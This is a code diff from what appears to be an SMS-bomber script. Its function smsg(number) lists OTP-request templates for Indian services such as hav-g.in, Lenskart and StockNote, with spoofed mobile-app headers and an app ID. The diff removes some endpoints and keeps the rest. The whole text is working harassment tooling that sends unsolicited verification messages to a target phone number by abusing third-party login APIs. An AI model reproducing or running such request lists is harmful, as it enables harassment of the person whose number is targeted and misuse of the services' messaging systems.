@@ -95,38 +95,7 @@ def smsg(number):
                 "phone": number
             }
         },
-        {
-            "url": "https://api.hav-g.in/v2/auth/challenge",
-            "method": "POST",
-            "headers": {
-                "Host": "api.hav-g.in",
-                "accept": "application/json, text/plain, */*",
-                "source": "APP",
-                "content-type": "application/json",
-                "content-length": "25",
-                "accept-encoding": "gzip",
-                "user-agent": "okhttp/4.11.0"
-            },
-            "data": {
-                "phone": "+91"+number
-            }
-        },
-        {
-            "url": "https://api.hav-g.in/v2/auth/challenge?resend=true",
-            "method": "POST",
-            "headers": {
-                "Host": "api.hav-g.in",
-                "accept": "application/json, text/plain, */*",
-                "source": "APP",
-                "content-type": "application/json",
-                "content-length": "25",
-                "accept-encoding": "gzip",
-                "user-agent": "okhttp/4.11.0"
-            },
-            "data": {
-                "phone":"+91"+ number
-            }
-        },
+        
         {
             "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
             "method": "POST",
@@ -231,31 +200,6 @@ def smsg(number):
                     "phone_number": f"+91{number}"
                 },
                 "via": "whatsapp"
-            }
-        },
-        {
-            "method": "POST",
-            "url": "https://tradws.stocknote.com/samco-webservice/AOF/LoginMobileOtp/1.0.0",
-            "headers": {
-                "Accept-Encoding": "gzip",
-                "Content-Type": "application/json; charset=utf-8",
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
-                "Host": "tradws.stocknote.com",
-                "Connection": "Keep-Alive",
-                "Content-Length": "258"
-            },
-            "data": {
-                "request": {
-                    "appID": "9218fd7787cf85cc9f58a7c3482a93bc",
-                    "formFactor": "M",
-                    "requestType": "U",
-                    "response_format": "json",
-                    "data": {
-                        "mobile": number,
-                        "remote_add": "0.0.0.0",
-                        "user_agent": "StockNote -42041,Android,Google,Android 14,CFNetwork 808.3,Darwin 16.3.0"
-                    }
-                }
             }
         },
         {
